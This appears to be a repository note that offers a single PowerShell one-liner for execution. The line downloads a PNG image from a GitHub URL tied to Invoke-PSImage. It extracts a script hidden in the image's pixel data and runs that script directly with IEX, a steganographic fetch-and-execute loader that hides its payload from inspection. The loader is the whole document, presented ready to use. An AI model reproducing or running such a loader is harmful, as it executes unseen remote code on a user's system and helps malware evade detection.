Oneliner to execute in Powershell

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://github.com/void010/purple/raw/main/Steg/ps_code_execute/Invoke-PSImage-master/best_img.png"));$o=a Byte[] 19200;(0..79)|%{foreach($x in(0..79)){$p=$g.GetPixel($x,$_);$o[($_*80+$x)*3]=$p.B;$o[($_*80+$x)*3+1]=$p.G;$o[($_*80+$x)*3+2]=$p.R}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..16973]))
